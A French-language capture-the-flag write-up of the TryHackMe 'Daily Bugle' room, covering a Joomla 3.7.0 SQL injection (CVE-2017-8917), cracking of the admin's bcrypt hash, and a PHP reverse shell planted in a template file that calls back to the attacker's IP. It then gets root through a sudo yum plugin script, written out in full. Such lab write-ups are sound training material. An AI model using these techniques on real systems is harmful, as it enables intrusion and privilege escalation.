---
title: "Write-up : TryHackMe - Daily Bugle"
date: 2025-05-25T14:00:00+02:00
draft: false
author: "AntoineWHR"
tags: ["TryHackMe", "CTF", "Linux", "Joomla", "SQLi", "CVE-2017-8917", "Privilege Escalation", "Yum"]
categories: ["WriteUps"]
comment:
  enable: true
description: "Solution complète du challenge TryHackMe Daily Bugle, de l'exploitation d'une vulnérabilité Joomla à l'élévation de privilèges via yum."
---

<!--more-->

# **Write-up : TryHackMe - Daily Bugle**

{{< admonition info "Informations sur la Room" >}}
*   **Nom :** Daily Bugle
*   **Plateforme :** TryHackMe
*   **Lien :** [https://tryhackme.com/room/dailybugle](https://tryhackme.com/room/dailybugle)
*   **Difficulté Annoncée :** Hard
*   **Objectif :** Obtenir les flags `user.txt` et `root.txt`.
*   **IP cible :** 10.10.21.204
{{< /admonition >}}

## **Introduction**

Ce challenge nous plonge dans l'univers de Spider-Man avec le site web du Daily Bugle. Notre mission est de compromettre le serveur hébergeant le site de J. Jonah Jameson et de récupérer les flags utilisateur et root. Cette room étant classée "Hard", nous allons devoir exploiter une vulnérabilité dans Joomla et escalader nos privilèges pour obtenir un accès root.

## **Phase 1 : Reconnaissance & Énumération**

### **1. Scan des Ports (Nmap)**

On commence par identifier les services exposés sur la machine cible avec un scan Nmap complet.

```bash
nmap -sC -sV -p- -T4 10.10.21.204
```
![nmap](/images/imagesdaily/nmap.png)


{{< admonition note "Résultats Clés du Scan Nmap" >}}
Le scan révèle trois ports ouverts :

*   **Port 22 (SSH) :** OpenSSH 7.4 - Service SSH standard
*   **Port 80 (HTTP) :** Apache httpd 2.4.6 - Serveur web avec Joomla
*   **Port 3306 (MySQL) :** MariaDB - Base de données (non autorisée depuis l'extérieur)

Le service HTTP semble être notre point d'entrée principal.
{{< /admonition >}}

![site](/images/imagesdaily/site.png)

### **2. Exploration Web - Identification de Joomla**

En visitant le site web sur le port 80, nous découvrons le site du Daily Bugle avec un article sur Spider-Man qui vole une banque. Le site semble utiliser Joomla comme CMS.

Pour identifier précisément la version de Joomla et ses vulnérabilités potentielles, utilisons JoomScan :

![joomscan](/images/imagesdaily/joomscan.png)


{{< admonition tip "Découverte Cruciale - Version Joomla" >}}
JoomScan révèle que le site utilise **Joomla 3.7.0**, une version particulièrement vulnérable à une injection SQL critique.
{{< /admonition >}}

## **Phase 2 : Recherche de Vulnérabilités**

### **Identification de CVE-2017-8917**

La version Joomla 3.7.0 est affectée par une vulnérabilité d'injection SQL critique référencée **CVE-2017-8917**. Cette faille permet d'extraire des informations sensibles de la base de données sans authentification.


## **Phase 3 : Exploitation - Injection SQL**

### **Exploitation avec SQLi Tool**

Utilisons un outil spécialisé pour exploiter la vulnérabilité CVE-2017-8917 :

```bash
python3 main.py --host 10.10.21.204
```
![alt text](/images/imagesdaily/cvesqli.png)
![alt text](/images/imagesdaily/crackjohn.png)

L'exploitation réussit et nous permet d'extraire les informations des utilisateurs de la base de données Joomla, notamment :
- **Utilisateur :** jonah (Super User)
- **Hash du mot de passe :** `$2y$10$0veO/JSFh4389Luc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`

### **Craquage du Hash avec John the Ripper**

Le hash récupéré est au format bcrypt. Utilisons John the Ripper pour le craquer :

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

{{< admonition success "Mot de Passe Trouvé !" >}}
John the Ripper réussit à craquer le hash et révèle le mot de passe : **spiderman123**
{{< /admonition >}}

## **Phase 4 : Accès au Panel Administrateur Joomla**

### **Connexion à l'Interface d'Administration**

Avec les identifiants récupérés, on se connecte à l'interface d'administration Joomla :

```
URL : http://10.10.21.204/administrator/
Utilisateur : jonah
Mot de passe : spiderman123
```

![joomla](/images/imagesdaily/joomla.png)

Bingo ! On est connecté, on continue !

### **Recherche de Points d'Injection de Code**

Pour obtenir un reverse shell, nous devons identifier où injecter du code PHP. Le template par défaut "Protostar" est une cible idéale car nous pouvons modifier ses fichiers.

{{< admonition tip "Stratégie d'Injection" >}}
Navigation : Extensions → Templates → Templates → Protostar → error.php

Le fichier error.php est parfait car il est rarement utilisé et nous pouvons y injecter notre payload PHP.
{{< /admonition >}}

## **Phase 5 : Obtention du Reverse Shell**

### **Injection du Payload PHP**

Remplaçons le contenu du fichier error.php par un reverse shell PHP (PentestMonkey) :

```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.14.96.113';  // Notre IP
$port = 4444;          // Port d'écoute
// ... (code complet du reverse shell)
?>
```

### **Déclenchement du Reverse Shell**

```bash
# Configuration de l'écoute
nc -lnvp 4444

# Déclenchement en visitant le fichier error.php
curl http://10.10.21.204/templates/protostar/error.php
```

![reverse](/images/imagesdaily/reverse.png)

Nouvelle étape ! Unn shell en tant qu'utilisateur `apache` ! On rentre dans le dur ! 

## **Phase 6 : Élévation de Privilèges - Flag Utilisateur**

### **Exploration du Système**

On explore un peu mais impossible d'accéder au home de Jonah ! On va devoir accéder au site pour en savoir plus.

```bash
cd /var/www/html
ls -la
```

### **Découverte des Identifiants SSH**

Dans le fichier de configuration de Joomla (`configuration.php`), nous trouvons les identifiants de la base de données :

```bash
cat configuration.php
```
![config](/images/imagesdaily/configurationphp.png)

Nous découvrons un mot de passe : `nv5uz9r3ZEDzVjNu`

### **Test de Réutilisation de Mot de Passe**

Testons ce mot de passe avec l'utilisateur `jjameson` que nous avons identifié :

```bash
ssh jjameson@10.10.21.204
```

{{< admonition success "Connexion SSH Réussie !" >}}
Le mot de passe fonctionne ! Nous sommes maintenant connectés en tant que `jjameson`.
{{< /admonition >}}

### **Récupération du Flag Utilisateur**

```bash
ls
cat user.txt
```
![ssh](/images/imagesdaily/sshjonah.png)

## **Phase 7 : Élévation de Privilèges Root**

### **Vérification des Privilèges Sudo**

Première chose faite quand je suis sur une session :

```bash
sudo -l
```

{{< admonition warning "Privilège Sudo Découvert !" >}}
L'utilisateur `jjameson` peut exécuter `/usr/bin/yum` en tant que root sans mot de passe :
```text
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```
{{< /admonition >}}

![sudol](/images/imagesdaily/sudol.png)

### **Exploitation via Yum (GTFOBins)**

Le binaire `yum` peut être détourné pour obtenir un shell root. Consultons [GTFOBins](https://gtfobins.github.io/gtfobins/yum/) pour la technique d'exploitation.


```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
    os.execl('/bin/sh', '/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```
![root](/images/imagesdaily/root.png)

{{< admonition success "Root Obtenu !" >}}
Nous obtenons un shell root ! L'exploitation via yum fonctionne parfaitement.
{{< /admonition >}}

### **Récupération du Flag Root**

```bash
id

cd /root
cat root.txt
```

> - Patron, votre femme au téléphone. Elle dit qu’elle a perdu sa carte bleue.
> - Merci pour la bonne nouvelle !

